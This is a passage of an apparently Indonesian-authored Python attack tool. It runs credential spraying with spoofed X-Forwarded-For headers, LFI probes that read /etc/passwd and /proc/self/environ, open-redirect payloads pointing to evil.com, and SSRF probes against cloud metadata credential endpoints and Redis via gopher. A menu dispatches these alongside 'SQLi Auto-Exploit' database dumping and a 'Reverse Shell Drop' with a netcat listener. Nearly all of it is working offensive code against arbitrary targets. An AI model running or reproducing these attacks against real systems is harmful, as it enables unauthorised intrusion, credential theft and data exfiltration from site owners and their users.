        h  = {**HEADERS, "User-Agent": ua, "X-Forwarded-For": f"10.0.0.{(i%254)+1}"}
        try:
            rp = requests.post(
                target,
                data={"username": usr, "password": pwd, "user": usr, "pass": pwd},
                timeout=5, verify=False, headers=h, allow_redirects=True)
            data["tested"] += 1
            if rp.status_code in [200,302] and not any(s in rp.text.lower() for s in fail_signs):
                warn(f"HIT → {usr}:{pwd}")
                data["hits"].append({"user": usr, "pass": pwd, "status": rp.status_code})
                data["success"] = True
            else:
                miss(f"{usr}:{pwd}")
            time.sleep(0.15)  # jitter minimal
        except:
            pass

    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['hits'])}")
    store("Credential Spray", data)

# 22 — LFI Probe
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    # null byte (PHP < 5.3)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.php",
    # encoding bypass
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # double slash
    "....//....//....//etc/passwd",
    # windows
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    # PHP filter wrapper
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.toupper/resource=/etc/passwd",
    # proc self
    "/proc/self/environ",
    "/proc/self/cmdline",
]
LFI_SIGNS = ["root:x:","bin:x:","daemon:x:","[boot loader]","[fonts]",
             "HTTP_USER_AGENT","DOCUMENT_ROOT","cmdline"]
LFI_PARAMS = ["file","page","include","path","template","doc","view",
              "content","load","read","lang","language"]

def lfi_probe(url):
    info(f"LFI Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    for param in LFI_PARAMS:
        for pl in LFI_PAYLOADS:
            target = f"{url}?{param}={pl}"
            try:
                r = requests.get(target, timeout=6, verify=False, headers=HEADERS)
                data["tested"] += 1
                if any(s in r.text for s in LFI_SIGNS):
                    warn(f"LFI HIT → ?{param}={pl[:50]}")
                    data["vulnerable"].append({"param": param, "payload": pl,
                                               "snippet": r.text[:200]})
                    data["success"] = True
                    break  # param ini vuln, lanjut param berikutnya
            except:
                pass
    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['vulnerable'])}")
    store("LFI Probe", data)

# 23 — Open Redirect Scanner
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "/\\evil.com",
    "https:evil.com",
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]
REDIRECT_PARAMS = ["url","redirect","next","return","goto","target","dest",
                   "destination","redir","location","continue","back","forward"]

def open_redirect_scan(url):
    info(f"Open Redirect Scan → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    for param in REDIRECT_PARAMS:
        for pl in REDIRECT_PAYLOADS:
            target = f"{url}?{param}={requests.utils.quote(pl)}"
            try:
                r = requests.get(target, timeout=5, verify=False,
                                 headers=HEADERS, allow_redirects=False)
                data["tested"] += 1
                loc = r.headers.get("Location","")
                if r.status_code in [301,302,303,307,308] and "evil.com" in loc:
                    warn(f"OPEN REDIRECT → ?{param}={pl} → {loc}")
                    data["vulnerable"].append({"param": param, "payload": pl, "location": loc})
                    data["success"] = True
                else:
                    miss(f"{r.status_code} → ?{param}={pl[:30]}")
            except:
                pass
    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['vulnerable'])}")
    store("Open Redirect Scan", data)

# 24 — SSRF Probe
SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",# GCP
    "http://169.254.169.254/metadata/v1/",                # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",           # Alibaba
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:3306/",     # MySQL
    "http://127.0.0.1:6379/",     # Redis
    "http://127.0.0.1:27017/",    # MongoDB
    "dict://127.0.0.1:6379/info", # Redis via dict://
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",  # Redis via gopher
    "file:///etc/passwd",
    "file:///etc/hostname",
]
SSRF_PARAMS = ["url","target","src","source","fetch","load","request",
               "uri","path","endpoint","proxy","host","server"]
SSRF_SIGNS  = ["ami-id","instance-id","computeMetadata","root:x:",
               "hostname","redis_version","mongod","Connected"]

def ssrf_probe(url):
    info(f"SSRF Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    gcp_headers = {**HEADERS, "Metadata-Flavor": "Google"}
    for param in SSRF_PARAMS:
        for ssrf_target in SSRF_TARGETS:
            target = f"{url}?{param}={requests.utils.quote(ssrf_target)}"
            try:
                h = gcp_headers if "google" in ssrf_target else HEADERS
                r = requests.get(target, timeout=6, verify=False, headers=h)
                data["tested"] += 1
                if any(s in r.text for s in SSRF_SIGNS) or r.status_code == 200 and len(r.text) > 50:
                    warn(f"SSRF HIT → ?{param}={ssrf_target[:50]}")
                    data["vulnerable"].append({
                        "param": param, "ssrf_target": ssrf_target,
                        "status": r.status_code, "snippet": r.text[:300]})
                    data["success"] = True
                else:
                    miss(f"{r.status_code} → ?{param}={ssrf_target[:30]}")
            except:
                pass
    print(C["c"] + f"\n  Tested: {data['tested']} | Hits: {len(data['vulnerable'])}")
    store("SSRF Probe", data)

# ══════════════════════════════════════════
#  FULL RECON
# ══════════════════════════════════════════

ALL_STEPS = [
    ("Header Inspector",        header_inspector),
    ("DNS Lookup",              dns_lookup),
    ("Port Scanner",            port_scanner),
    ("WHOIS Grab",              whois_grab),
    ("Dir Brute-Force",         dir_bruteforce),
    ("Tech Fingerprint",        tech_fingerprint),
    ("SQL Inject Probe",        sqli_probe),
    ("NoSQL Inject Probe",      nosql_probe),
    ("Command Inject Probe",    cmdi_probe),
    ("XSS Probe",               xss_probe),
    ("XXE Probe",               xxe_probe),
    ("Broken Auth",             broken_auth),
    ("Sensitive Data Scan",     sensitive_data_scan),
    ("Broken Access Control",   broken_access_ctrl),
    ("Security Misconfig",      security_misconfig),
    ("Insecure Deserialization",insecure_deser),
    ("Known Vuln Check",        known_vuln_check),
    ("Subdomain Enum",          subdomain_enum),
    ("LFI Probe",               lfi_probe),
    ("Open Redirect Scan",      open_redirect_scan),
    ("SSRF Probe",              ssrf_probe),
]

def full_recon(url):
    print(C["m"] + C["B"] + "\n  ══════ FULL OWASP RECON ACTIVATED ══════\n")
    for name, fn in ALL_STEPS:
        section(name)
        fn(url)
        time.sleep(0.2)
    print(C["m"] + C["B"] + "\n  ══════ FULL RECON COMPLETE ══════\n")

# ══════════════════════════════════════════
#  SUMMARY — hanya yang berhasil + detail
# ══════════════════════════════════════════

def print_summary():
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    W  = 56

    def box_line(text, color=C["w"]):
        padded = text[:W-4].ljust(W-4)
        print(C["w"] + C["B"] + "  ║" + color + padded + C["w"] + C["B"] + "║")

    SUCCESS_LIST  = {m: d for m, d in RESULTS.items() if d.get("success")}
    VULN_FOUND    = []

    print()
    print(C["c"] + C["B"] + "  ╔" + "═"*W + "╗")
    box_line(f"  HASIL SCAN — {ts}", C["c"] + C["B"])
    box_line(f"  Target  : {TARGET_URL}", C["y"])
    box_line(f"  Metode  : {len(RESULTS)} dijalankan | {len(SUCCESS_LIST)} temuan", C["y"])
    print(C["c"] + C["B"] + "  ╠" + "═"*W + "╣")

    if not SUCCESS_LIST:
        box_line("  Tidak ada vulnerability yang ditemukan.", C["g"])
        print(C["c"] + C["B"] + "  ╚" + "═"*W + "╝\n")
        return

    for method, data in SUCCESS_LIST.items():
        print(C["c"] + C["B"] + "  ╠" + "─"*W + "╣")
        box_line(f"  ⚠  {method}", C["r"] + C["B"])
        print(C["c"] + C["B"] + "  ╠" + "─"*W + "╣")

        if method == "Header Inspector":
            box_line(f"    Status  : {data.get('status')}", C["y"])
            box_line(f"    URL     : {data.get('final_url','?')}", C["w"])
            VULN_FOUND.append(f"Header Inspector — status {data.get('status')}")

        elif method == "DNS Lookup":
            for rt, vals in data.get("records",{}).items():
                if vals:
                    box_line(f"    [{rt}] {', '.join(vals[:2])}", C["y"])
            VULN_FOUND.append("DNS Lookup — record ditemukan")

        elif method == "Port Scanner":
            opens = data.get("open",[])
            box_line(f"    Open ports: {opens}", C["r"])
            VULN_FOUND.append(f"Port Scanner — {len(opens)} port terbuka: {opens}")

        elif method == "WHOIS Grab":
            for l in data.get("info",[])[:4]:
                box_line(f"    {l}", C["y"])
            VULN_FOUND.append("WHOIS — info registrar ditemukan")

        elif method == "Dir Brute-Force":
            found = data.get("found",[])
            box_line(f"    Found: {len(found)} path", C["r"])
            for f in found[:5]:
                box_line(f"    [{f['status']}] {f['path']}", C["y"])
            VULN_FOUND.append(f"Dir Brute — {len(found)} path ditemukan")

        elif method == "Tech Fingerprint":
            detected = data.get("detected",[])
            box_line(f"    CMS/Stack : {', '.join(detected)}", C["y"])
            box_line(f"    Server    : {data.get('server','?')}", C["y"])
            VULN_FOUND.append(f"Tech Fingerprint — {', '.join(detected)}")

        elif method == "SQL Inject Probe":
            for pl in data.get("vulnerable",[])[:3]:
                box_line(f"    [ERROR-BASED] {pl}", C["r"])
                VULN_FOUND.append(f"SQLi Error-Based → {pl}")
            for pl in data.get("blind",[])[:3]:
                box_line(f"    [TIME-BASED]  {pl}", C["r"])
                VULN_FOUND.append(f"SQLi Time-Based → {pl}")

        elif method == "NoSQL Inject Probe":
            for pl in data.get("vulnerable",[])[:3]:
                box_line(f"    {pl[:50]}", C["r"])
            VULN_FOUND.append(f"NoSQL Injection — {len(data.get('vulnerable',[]))} payload hit")

        elif method == "Command Inject Probe":
            for pl in data.get("vulnerable",[])[:3]:
                box_line(f"    {pl}", C["r"])
            VULN_FOUND.append(f"CMDi — {len(data.get('vulnerable',[]))} payload hit")

        elif method == "XSS Probe":
            for pl in data.get("reflected",[])[:3]:
                box_line(f"    [REFLECTED] {pl[:50]}", C["r"])
            VULN_FOUND.append(f"XSS Reflected — {len(data.get('reflected',[]))} payload")

        elif method == "XXE Probe":
            box_line("    XXE injection terdeteksi", C["r"])
            VULN_FOUND.append("XXE Injection")

        elif method == "Broken Auth":
            for w in data.get("weak_creds",[])[:5]:
                box_line(f"    CREDS: {w['user']}:{w['pass']} @ {w['url']}", C["r"])
                VULN_FOUND.append(f"Broken Auth — {w['user']}:{w['pass']}")
            for ck in data.get("cookie_issues",[])[:3]:
                box_line(f"    COOKIE '{ck['cookie']}': {', '.join(ck['issues'])}", C["y"])
                VULN_FOUND.append(f"Cookie issue — {ck['cookie']}")

        elif method == "Sensitive Data Scan":
            if not data.get("https"):
                box_line("    HTTP tanpa enkripsi", C["r"])
                VULN_FOUND.append("No HTTPS")
            for e in data.get("exposed",[])[:5]:
                box_line(f"    EXPOSED: {e['path']} ({e['size']} bytes)", C["r"])
                VULN_FOUND.append(f"File exposed: {e['path']}")

        elif method == "Broken Access Control":
            for p in data.get("open_admin",[])[:4]:
                box_line(f"    [{p['status']}] {p['path']}", C["r"])
                VULN_FOUND.append(f"Open path: {p['path']}")
            for b in data.get("method_bypass",[])[:3]:
                box_line(f"    METHOD: {b['method']} ({b['status']})", C["r"])
                VULN_FOUND.append(f"Method bypass: {b['method']}")

        elif method == "Security Misconfig":
            for h in data.get("missing_headers",[])[:5]:
                box_line(f"    MISSING: {h}", C["y"])
                VULN_FOUND.append(f"Missing header: {h}")
            if data.get("verbose_errors"):
                box_line("    Verbose error info exposed", C["r"])
                VULN_FOUND.append("Verbose error exposed")

        elif method == "Insecure Deserialization":
            for v in data.get("vulnerable",[])[:3]:
                box_line(f"    {v}", C["r"])
            VULN_FOUND.append(f"Insecure Deser — {', '.join(data.get('vulnerable',[]))}")

        elif method == "Known Vuln Check":
            for m in data.get("matches",[])[:5]:
                box_line(f"    {m['version']} → {m['cve']}", C["r"])
                VULN_FOUND.append(f"CVE: {m['cve']}")

        elif method == "Subdomain Enum":
            for s in data.get("live",[])[:5]:
                box_line(f"    {s['host']} → {s['ip']}", C["y"])
            VULN_FOUND.append(f"Subdomain: {len(data.get('live',[]))} live")

        elif method == "SQLi Auto-Exploit":
            box_line(f"    Columns : {data.get('columns',0)}", C["y"])
            if data.get("database"):
                box_line(f"    Database: {data['database']}", C["r"])
                VULN_FOUND.append(f"SQLi dump — DB: {data['database']}")
            for tbl in data.get("tables",[])[:8]:
                box_line(f"    Table   : {tbl}", C["r"])
            for tbl, cols in data.get("columns_dump",{}).items():
                box_line(f"    Columns [{tbl}]: {', '.join(cols[:6])}", C["y"])

        elif method == "Reverse Shell Drop":
            box_line(f"    Param vuln : ?{data.get('vuln_param')}", C["r"])
            box_line(f"    Payload sent: {len(data.get('shell_sent',[]))}", C["r"])
            box_line(f"    Listener   : nc -lvnp {data.get('lport')}", C["y"])
            VULN_FOUND.append(f"Reverse Shell Drop → {data.get('lhost')}:{data.get('lport')}")

        elif method == "Credential Spray":
            for h in data.get("hits",[])[:5]:
                box_line(f"    {h['user']}:{h['pass']} ({h['status']})", C["r"])
                VULN_FOUND.append(f"Cred Spray hit — {h['user']}:{h['pass']}")

        elif method == "LFI Probe":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['payload'][:40]}", C["r"])
                box_line(f"    → {v['snippet'][:50]}", C["y"])
                VULN_FOUND.append(f"LFI → ?{v['param']}={v['payload'][:30]}")

        elif method == "Open Redirect Scan":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['payload'][:30]}", C["r"])
                box_line(f"    → {v['location']}", C["y"])
                VULN_FOUND.append(f"Open Redirect → ?{v['param']}")

        elif method == "SSRF Probe":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['ssrf_target'][:40]}", C["r"])
                box_line(f"    ({v['status']}) {v['snippet'][:50]}", C["y"])
                VULN_FOUND.append(f"SSRF → ?{v['param']}={v['ssrf_target'][:30]}")

    # ── TOTAL VULN ────────────────────────────
    print(C["r"] + C["B"] + "  ╠" + "═"*W + "╣")
    box_line(f"  TOTAL VULN DITEMUKAN: {len(VULN_FOUND)}", C["r"] + C["B"])
    print(C["r"] + C["B"] + "  ╠" + "─"*W + "╣")
    for i, v in enumerate(VULN_FOUND, 1):
        box_line(f"  {i:>2}. {v}", C["y"])
    print(C["r"] + C["B"] + "  ╚" + "═"*W + "╝")
    print()

# ══════════════════════════════════════════
#  SIMPAN HASIL
# ══════════════════════════════════════════

def save_results():
    ts     = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    domain = get_domain(TARGET_URL).replace(".", "_")
    fname  = f"mr414n_{domain}_{ts}.json"
    with open(fname, "w") as f:
        json.dump({"target": TARGET_URL, "timestamp": ts,
                   "results": RESULTS}, f, indent=2, default=str)
    print(C["g"] + C["B"] + f"\n  [✓] Hasil disimpan → {fname}\n")

# ══════════════════════════════════════════
#  POST-SCAN MENU
# ══════════════════════════════════════════

def post_scan_menu():
    print_summary()
    while True:
        print(C["g"] + C["B"] + "  ┌─[ NEXT STEP ]──────────────────────────────┐")
        print(C["g"] + "  │ " + C["y"] + "[1]" + C["w"] + " Lanjut scan metode lain")
        print(C["g"] + "  │ " + C["y"] + "[2]" + C["w"] + " Keluar tools")
        print(C["g"] + "  │ " + C["y"] + "[3]" + C["w"] + " Simpan hasil ke file .json")
        print(C["g"] + C["B"] + "  └────────────────────────────────────────────┘")
        print()
        ch = input(C["w"] + "  Pilih » ").strip()
        if ch == "1":
            return "continue"
        elif ch == "2":
            print(C["r"] + "\n  [*] Keluar. Stay sharp.\n")
            sys.exit(0)
        elif ch == "3":
            save_results()
        else:
            print(C["r"] + "  [!] Pilihan tidak valid.")

# ══════════════════════════════════════════
#  DISPATCH & MAIN
# ══════════════════════════════════════════

DISPATCH = {
    "1" : ("Header Inspector",        header_inspector),
    "2" : ("DNS Lookup",              dns_lookup),
    "3" : ("Port Scanner",            port_scanner),
    "4" : ("WHOIS Grab",              whois_grab),
    "5" : ("Dir Brute-Force",         dir_bruteforce),
    "6" : ("Tech Fingerprint",        tech_fingerprint),
    "7" : ("SQL Inject Probe",        sqli_probe),
    "8" : ("NoSQL Inject Probe",      nosql_probe),
    "9" : ("Command Inject Probe",    cmdi_probe),
    "10": ("XSS Probe",               xss_probe),
    "11": ("XXE Probe",               xxe_probe),
    "12": ("Broken Auth",             broken_auth),
    "13": ("Sensitive Data Scan",     sensitive_data_scan),
    "14": ("Broken Access Control",   broken_access_ctrl),
    "15": ("Security Misconfig",      security_misconfig),
    "16": ("Insecure Deserialization",insecure_deser),
    "17": ("Known Vuln Check",        known_vuln_check),
    "18": ("Subdomain Enum",          subdomain_enum),
    "19": ("SQLi Auto-Exploit",       sqli_autoexploit),
    "20": ("Reverse Shell Drop",      reverse_shell_drop),
    "21": ("Credential Spray",        credential_spray),
    "22": ("LFI Probe",               lfi_probe),
    "23": ("Open Redirect Scan",      open_redirect_scan),
    "24": ("SSRF Probe",              ssrf_probe),
}

def main():
    while True:
        banner()
        menu()
        choice = input(C["w"] + "  Pilih » ").strip().upper()
        if choice == "0":
            print(C["r"] + "\n  [*] Keluar. Stay sharp.\n")
            sys.exit(0)
        elif choice == "A":
            url = get_target("Full OWASP Recon — semua metode")
            full_recon(url)
        elif choice in DISPATCH:
            name, fn = DISPATCH[choice]
            url = get_target(name)
            fn(url)
        else:
            print(C["r"] + "  [!] Pilihan tidak valid.")
            time.sleep(1)
            continue
        post_scan_menu()

if __name__ == "__main__":
    main()
